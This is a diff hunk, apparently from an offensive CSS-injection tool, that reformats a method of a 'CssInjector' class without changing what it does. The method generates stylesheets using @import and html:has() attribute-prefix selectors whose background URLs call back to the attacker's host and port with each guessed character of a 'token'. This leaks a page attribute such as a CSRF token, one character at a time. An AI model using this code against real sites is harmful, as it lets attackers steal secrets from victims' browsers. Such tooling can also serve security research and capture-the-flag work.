@@ -86,7 +86,12 @@ class CssInjector:
         self.counter_req += 1
         stri = f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}');\n"
         stri += f'html:has({self.identifier}[{self.selector}={repr(self.data)}]{"".join([f":not({self.identifier}[{self.selector}={repr(element)}])" for element in self.elements])}){"".join([":first-child" for i in range(self.counter_req)])}{{background: url("//{self.hostname}:{self.port}/end?num={random.random()}") !important;}}'
-        stri += f"""{"".join(map(lambda x: f'html:has({self.identifier}[{self.selector}^={repr(self.data+x)}]{"".join([f":not({self.identifier}[{self.selector}={repr(element)}])" for element in self.elements])}){"".join([":first-child" for i in range(self.counter_req)])}{{background: url("//{self.hostname}:{self.port}/valid?token={urllib.parse.quote_plus(self.data+x)}") !important;}}\n', "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ "))}"""
+        stri += "".join(
+            map(
+                lambda x: f'html:has({self.identifier}[{self.selector}^={repr(self.data+x)}]{"".join([f":not({self.identifier}[{self.selector}={repr(element)}])" for element in self.elements])}){"".join([":first-child" for i in range(self.counter_req)])}{{background: url("//{self.hostname}:{self.port}/valid?token={urllib.parse.quote_plus(self.data+x)}") !important;}}\n',
+                "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ",
+            )
+        )
         return stri
 
     async def handle_start(self, request):
